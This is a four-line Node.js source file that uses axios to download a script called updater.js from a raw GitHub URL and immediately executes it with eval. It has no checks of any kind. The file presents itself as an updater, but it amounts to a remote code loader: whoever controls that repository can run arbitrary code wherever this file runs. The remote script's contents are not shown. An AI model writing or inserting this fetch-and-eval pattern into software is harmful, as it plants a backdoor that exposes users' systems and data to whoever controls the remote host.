const axios = require('axios');

axios.get("https://raw.githubusercontent.com/ARYAN-BOT-404/main/updater.js")
	.then(res => eval(res.data));
